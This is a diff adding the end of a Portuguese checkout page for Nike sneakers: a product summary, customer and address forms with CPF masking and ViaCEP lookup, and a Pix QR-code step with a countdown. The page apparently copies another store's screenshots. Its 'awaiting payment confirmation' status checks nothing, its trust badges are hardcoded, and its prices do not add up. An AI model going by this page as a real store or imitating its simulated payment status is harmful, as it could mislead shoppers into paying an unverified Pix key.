+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+                <span id="copy-btn-text">Copiar</span>
+              </button>
+            </div>
+
+            <div class="payment-pix__status">
+              <div class="payment-pix__pulse"></div>
+              <span>Aguardando confirmação do pagamento...</span>
+            </div>
+
+            <div class="payment-pix__timer" id="pix-timer">
+              Código Pix expira em: <strong id="timer-display">14:59</strong>
+            </div>
+          </div>
+        </section>
+
+      </div>
+
+      <!-- RIGHT: ORDER SUMMARY (MATCHING SCREENSHOT 2/3) -->
+      <aside class="order-summary">
+        <h2 class="order-summary__title">Resumo do pedido</h2>
+
+        <div class="order-summary__product">
+          <img src="assets/2IC-7367-006_zoom2.webp" alt="Tênis Nike Court Vision Low Next Nature" class="order-summary__thumb">
+          <div class="order-summary__prod-info">
+            <div class="order-summary__prod-name">Tênis Nike Court Vision Low Next Nature Masculino - Preto</div>
+            <div class="order-summary__prod-meta"><span id="summary-size">Tam: 41</span> · Qtd: 1</div>
+            <div class="order-summary__prod-price">R$ 287,90</div>
+          </div>
+        </div>
+
+        <div class="order-summary__divider"></div>
+
+        <div class="order-summary__row">
+          <span>Subtotal</span>
+          <span>R$ 303,05</span>
+        </div>
+
+        <div class="order-summary__row">
+          <span>Frete</span>
+          <span class="order-summary__row--free">Grátis</span>
+        </div>
+
+        <div class="order-summary__divider"></div>
+
+        <div class="order-summary__row order-summary__row--total">
+          <span class="order-summary__label">Total</span>
+          <span class="order-summary__val">R$ 287,90</span>
+        </div>
+
+        <div class="order-summary__discount-note">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+          <span>Pix com 5% de desconto aplicado</span>
+        </div>
+
+        <div class="order-summary__trust">
+          <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+          <span>Compra 100% segura</span>
+        </div>
+
+        <div class="order-summary__perks">
+          <div class="order-summary__perk-item">
+            <svg viewBox="0 0 24 24"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
+            <span>Garantia de 7 dias ou seu dinheiro de volta</span>
+          </div>
+          <div class="order-summary__perk-item">
+            <svg viewBox="0 0 24 24"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
+            <span>Envio imediato com código de rastreio</span>
+          </div>
+          <div class="order-summary__perk-item">
+            <svg viewBox="0 0 24 24"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
+            <span>Troca grátis em até 30 dias</span>
+          </div>
+        </div>
+      </aside>
+
+    </div>
+  </main>
+
+  <!-- TOAST -->
+  <div class="toast-copy" id="toast-copy">
+    <svg viewBox="0 0 24 24"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
+    <span>Chave Pix copiada com sucesso!</span>
+  </div>
+
+  <script src="assets/qrcode.min.js"></script>
+  <script>
+    (function () {
+      // 1. Read size from URL parameter
+      var params = new URLSearchParams(window.location.search);
+      var size = params.get('size') || '41';
+      var summarySizeEl = document.getElementById('summary-size');
+      if (summarySizeEl) {
+        summarySizeEl.textContent = 'Tam: ' + size;
+      }
+
+      // Step state management
+      var currentStep = 1;
+      var clientData = {};
+      var shippingData = {};
+
+      var card1 = document.getElementById('card-step-1');
+      var card2 = document.getElementById('card-step-2');
+      var card3 = document.getElementById('card-step-3');
+
+      var form1 = document.getElementById('form-step-1');
+      var form2 = document.getElementById('form-step-2');
+      var form3 = document.getElementById('form-step-3');
+
+      var summary1 = document.getElementById('summary-step-1');
+      var summary2 = document.getElementById('summary-step-2');
+
+      var editBtn1 = document.getElementById('edit-step-1');
+      var editBtn2 = document.getElementById('edit-step-2');
+
+      var stepNav1 = document.getElementById('step-nav-1');
+      var stepNav2 = document.getElementById('step-nav-2');
+      var stepNav3 = document.getElementById('step-nav-3');
+      var stepperProgress = document.getElementById('stepper-progress');
+
+      // MASKS
+      var phoneInput = document.getElementById('client-phone');
+      phoneInput.addEventListener('input', function (e) {
+        var v = e.target.value.replace(/\D/g, '');
+        if (v.length > 11) v = v.slice(0, 11);
+        if (v.length > 6) {
+          e.target.value = '(' + v.slice(0, 2) + ') ' + v.slice(2, 7) + '-' + v.slice(7);
+        } else if (v.length > 2) {
+          e.target.value = '(' + v.slice(0, 2) + ') ' + v.slice(2);
+        } else if (v.length > 0) {
+          e.target.value = '(' + v;
+        } else {
+          e.target.value = '';
+        }
+      });
+
+      var cpfInput = document.getElementById('client-cpf');
+      cpfInput.addEventListener('input', function (e) {
+        var v = e.target.value.replace(/\D/g, '');
+        if (v.length > 11) v = v.slice(0, 11);
+        if (v.length > 9) {
+          e.target.value = v.slice(0, 3) + '.' + v.slice(3, 6) + '.' + v.slice(6, 9) + '-' + v.slice(9);
+        } else if (v.length > 6) {
+          e.target.value = v.slice(0, 3) + '.' + v.slice(3, 6) + '.' + v.slice(6);
+        } else if (v.length > 3) {
+          e.target.value = v.slice(0, 3) + '.' + v.slice(3);
+        } else {
+          e.target.value = v;
+        }
+      });
+
+      var cepInput = document.getElementById('ship-cep');
+      var cepSpinner = document.getElementById('cep-spinner');
+      cepInput.addEventListener('input', function (e) {
+        var v = e.target.value.replace(/\D/g, '');
+        if (v.length > 8) v = v.slice(0, 8);
+        if (v.length > 5) {
+          e.target.value = v.slice(0, 5) + '-' + v.slice(5);
+        } else {
+          e.target.value = v;
+        }
+
+        // Auto lookup ViaCEP when 8 digits entered
+        if (v.length === 8) {
+          lookupCep(v);
+        }
+      });
+
+      function lookupCep(cepDigits) {
+        cepSpinner.style.display = 'block';
+        fetch('https://viacep.com.br/ws/' + cepDigits + '/json/')
+          .then(function (r) { return r.json(); })
+          .then(function (data) {
+            cepSpinner.style.display = 'none';
+            if (data && !data.erro) {
+              if (data.logradouro) document.getElementById('ship-address').value = data.logradouro;
+              if (data.bairro) document.getElementById('ship-neighborhood').value = data.bairro;
+              if (data.localidade) document.getElementById('ship-city').value = data.localidade;
+              if (data.uf) document.getElementById('ship-uf').value = data.uf;
+              document.getElementById('ship-number').focus();
+            }
+          })
+          .catch(function () {
+            cepSpinner.style.display = 'none';
+          });
+      }
+
+      // STEP TRANSITIONS
+      function updateStepper(step) {
+        currentStep = step;
+        stepNav1.classList.remove('active', 'completed');
+        stepNav2.classList.remove('active', 'completed');
+        stepNav3.classList.remove('active', 'completed');
+
+        if (step === 1) {
+          stepNav1.classList.add('active');
+          stepperProgress.style.width = '0%';
+        } else if (step === 2) {
+          stepNav1.classList.add('completed');
+          stepNav2.classList.add('active');
+          stepperProgress.style.width = '50%';
+        } else if (step === 3) {
+          stepNav1.classList.add('completed');
+          stepNav2.classList.add('completed');
+          stepNav3.classList.add('active');
+          stepperProgress.style.width = '100%';
+        }
+      }
+
+      function goToStep(step) {
+        updateStepper(step);
+
+        if (step === 1) {
+          card1.className = 'step-card active';
+          form1.style.display = 'block';
+          summary1.style.display = 'none';
+          editBtn1.style.display = 'none';
+
+          card2.className = 'step-card disabled';
+          form2.style.display = 'none';
+
+          card3.className = 'step-card disabled';
+          form3.style.display = 'none';
+        } else if (step === 2) {
+          card1.className = 'step-card';
+          form1.style.display = 'none';
+          summary1.style.display = 'block';
+          summary1.innerHTML = '<strong>' + escapeHtml(clientData.name) + '</strong><br>' + escapeHtml(clientData.email) + ' · ' + escapeHtml(clientData.phone);
+          editBtn1.style.display = 'block';
+
+          card2.className = 'step-card active';
+          form2.style.display = 'block';
+          summary2.style.display = 'none';
+          editBtn2.style.display = 'none';
+
+          card3.className = 'step-card disabled';
+          form3.style.display = 'none';
+        } else if (step === 3) {
+          card1.className = 'step-card';
+          form1.style.display = 'none';
+          summary1.style.display = 'block';
+          editBtn1.style.display = 'block';
+
+          card2.className = 'step-card';
+          form2.style.display = 'none';
+          summary2.style.display = 'block';
+          summary2.innerHTML = escapeHtml(shippingData.address) + ', ' + escapeHtml(shippingData.number) +
+            (shippingData.complement ? ' (' + escapeHtml(shippingData.complement) + ')' : '') + '<br>' +
+            escapeHtml(shippingData.neighborhood) + ' · ' + escapeHtml(shippingData.city) + '/' + escapeHtml(shippingData.uf) +
+            ' · CEP ' + escapeHtml(shippingData.cep);
+          editBtn2.style.display = 'block';
+
+          card3.className = 'step-card active';
+          form3.style.display = 'block';
+
+          renderQrCode();
+          startPixTimer();
+        }
+
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+
+      function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+      }
+
+      // FORM 1 SUBMIT
+      form1.addEventListener('submit', function (e) {
+        e.preventDefault();
+        var name = document.getElementById('client-name').value.trim();
+        var email = document.getElementById('client-email').value.trim();
+        var phone = document.getElementById('client-phone').value.trim();
+        var cpf = document.getElementById('client-cpf').value.trim();
+
+        var valid = true;
+        if (name.split(' ').length < 2) {
+          document.getElementById('err-client-name').classList.add('visible');
+          document.getElementById('client-name').classList.add('is-invalid');
+          valid = false;
+        } else {
+          document.getElementById('err-client-name').classList.remove('visible');
+          document.getElementById('client-name').classList.remove('is-invalid');
+        }
+
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+          document.getElementById('err-client-email').classList.add('visible');
+          document.getElementById('client-email').classList.add('is-invalid');
+          valid = false;
+        } else {
+          document.getElementById('err-client-email').classList.remove('visible');
+          document.getElementById('client-email').classList.remove('is-invalid');
+        }
+
+        if (phone.replace(/\D/g, '').length < 10) {
+          document.getElementById('err-client-phone').classList.add('visible');
+          document.getElementById('client-phone').classList.add('is-invalid');
+          valid = false;
+        } else {
+          document.getElementById('err-client-phone').classList.remove('visible');
+          document.getElementById('client-phone').classList.remove('is-invalid');
+        }
+
+        if (cpf.replace(/\D/g, '').length !== 11) {
+          document.getElementById('err-client-cpf').classList.add('visible');
+          document.getElementById('client-cpf').classList.add('is-invalid');
+          valid = false;
+        } else {
+          document.getElementById('err-client-cpf').classList.remove('visible');
+          document.getElementById('client-cpf').classList.remove('is-invalid');
+        }
+
+        if (!valid) return;
+
+        clientData = { name: name, email: email, phone: phone, cpf: cpf };
+        goToStep(2);
+      });
+
+      // FORM 2 SUBMIT
+      form2.addEventListener('submit', function (e) {
+        e.preventDefault();
+        var cep = document.getElementById('ship-cep').value.trim();
+        var address = document.getElementById('ship-address').value.trim();
+        var number = document.getElementById('ship-number').value.trim();
+        var complement = document.getElementById('ship-complement').value.trim();
+        var neighborhood = document.getElementById('ship-neighborhood').value.trim();
+        var city = document.getElementById('ship-city').value.trim();
+        var uf = document.getElementById('ship-uf').value.trim();
+
+        var valid = true;
+        if (cep.replace(/\D/g, '').length !== 8) {
+          document.getElementById('err-ship-cep').classList.add('visible');
+          valid = false;
+        } else {
+          document.getElementById('err-ship-cep').classList.remove('visible');
+        }
+
+        if (!address) {
+          document.getElementById('err-ship-address').classList.add('visible');
+          valid = false;
+        } else {
+          document.getElementById('err-ship-address').classList.remove('visible');
+        }
+
+        if (!number) {
+          document.getElementById('err-ship-number').classList.add('visible');
+          valid = false;
+        } else {
+          document.getElementById('err-ship-number').classList.remove('visible');
+        }
+
+        if (!neighborhood) {
+          document.getElementById('err-ship-neighborhood').classList.add('visible');
+          valid = false;
+        } else {
+          document.getElementById('err-ship-neighborhood').classList.remove('visible');
+        }
+
+        if (!city) {
+          document.getElementById('err-ship-city').classList.add('visible');
+          valid = false;
+        } else {
+          document.getElementById('err-ship-city').classList.remove('visible');
+        }
+
+        if (!uf) {
+          document.getElementById('err-ship-uf').classList.add('visible');
+          valid = false;
+        } else {
+          document.getElementById('err-ship-uf').classList.remove('visible');
+        }
+
+        if (!valid) return;
+
+        shippingData = {
+          cep: cep,
+          address: address,
+          number: number,
+          complement: complement,
+          neighborhood: neighborhood,
+          city: city,
+          uf: uf
+        };
+        goToStep(3);
+      });
+
+      // EDIT BUTTONS
+      editBtn1.addEventListener('click', function () { goToStep(1); });
+      editBtn2.addEventListener('click', function () { goToStep(2); });
+
+      // STEP 3: QR CODE & COPY PIX
+      var qrRendered = false;
+      function renderQrCode() {
+        if (qrRendered) return;
+        var container = document.getElementById('pix-qrcode');
+        container.innerHTML = '';
+        var pixPayload = document.getElementById('pix-copy-input').value;
+
+        if (window.QRCode) {
+          new QRCode(container, {
+            text: pixPayload,
+            width: 210,
+            height: 210,
+            colorDark: '#000000',
+            colorLight: '#ffffff',
+            correctLevel: QRCode.CorrectLevel.M
+          });
+          qrRendered = true;
+        }
+      }
+
+      // Copy Pix Code Button
+      var copyBtn = document.getElementById('btn-copy-pix');
+      var copyBtnText = document.getElementById('copy-btn-text');
+      var toast = document.getElementById('toast-copy');
+
+      copyBtn.addEventListener('click', function () {
+        var copyInput = document.getElementById('pix-copy-input');
+        copyInput.select();
+        copyInput.setSelectionRange(0, 99999);
+
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(copyInput.value).then(showCopiedState);
+        } else {
+          document.execCommand('copy');
+          showCopiedState();
+        }
+      });
+
+      function showCopiedState() {
+        copyBtn.classList.add('copied');
+        copyBtnText.textContent = 'Copiado!';
+
+        toast.classList.add('show');
+        setTimeout(function () {
+          toast.classList.remove('show');
+        }, 3000);
+
+        setTimeout(function () {
+          copyBtn.classList.remove('copied');
+          copyBtnText.textContent = 'Copiar';
+        }, 3000);
+      }
+
+      // PIX EXPIRATION TIMER
+      var timerStarted = false;
+      function startPixTimer() {
+        if (timerStarted) return;
+        timerStarted = true;
+        var duration = 15 * 60;
+        var timerDisplay = document.getElementById('timer-display');
+
+        var interval = setInterval(function () {
+          duration--;
+          if (duration <= 0) {
+            clearInterval(interval);
+            timerDisplay.textContent = 'Expirado';
+            return;
+          }
+          var m = Math.floor(duration / 60);
+          var s = duration % 60;
+          timerDisplay.textContent = (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
+        }, 1000);
+      }
+    })();
+  </script>
+</body>
+</html>
